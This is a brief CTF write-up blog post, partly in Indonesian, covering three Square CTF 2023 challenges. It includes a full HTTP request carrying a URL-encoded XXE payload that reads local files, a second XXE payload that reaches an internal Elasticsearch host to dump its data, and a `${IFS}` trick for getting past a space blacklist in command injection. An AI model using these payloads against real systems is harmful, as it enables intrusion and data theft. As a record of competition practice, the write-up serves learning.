---
title: Square CTF
date: 2023-11-12 00:00:00 +/-TTTT
categories: [CTFs Archive, 2023 CTF]
tags: [CTFs]     # TAG names should always be lowercase
comments: true
---

- Tags: international
- Status: Done
- pwned: 3

# Be the admin

we need to become admin by changing the cookie

1. admin biasa ganti cookie
2. A nya gede

# Just go around

path traversal

```python
POST /accept HTTP/1.1
Host: 184.72.87.9:8013
Content-Length: 282
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://184.72.87.9:8013
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://184.72.87.9:8013/post
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

postXml=%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%20%3f%3e%3c!DOCTYPE%20foo%20%5b%20%3c!ENTITY%20xxe%20SYSTEM%20%22file:///%22%3e%20%5d%3e%3cpost%20author%3d%22CTF%20Participant%22%20id%3d%220%22%20title%3d%22*%22%3e%3cmessage%3e%26xxe%3b%3c%2fmessage%3e%3c%2fpost%3e
```

dari sini kita bisa analisa source code nya adapun flag di dalam service tersebut hal ini dikarenakan.

setelah saya membaca controller flag seperti nya terdapat di service lain yaitu

        `.builder(HttpHost.create("http://"+System.getProperty("ELASTIC_HOST", "db")+":9200"))`

flag tersebut terdapat di sebuah host elastic search untuk leak all data kita dapat menggunkan query berikut:

[`https://db:9200/_search?pretty=true`](https://db:9200/_search?pretty=true)

sehingga payload menjadi

```python
%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%20%3f%3e%3c!DOCTYPE%20foo%20%5b%20%3c!ENTITY%20xxe%20SYSTEM%20%22http://db:9200/_search?pretty=true%22%3e%20%5d%3e%3cpost%20author%3d%22CTF%20Participant%22%20id%3d%220%22%20title%3d%22*%22%3e%3cmessage%3e%26xxe%3b%3c%2fmessage%3e%3c%2fpost%3e
```

# Sandbox

terdapat blacklist space

`cat${IFS}flag.txt`


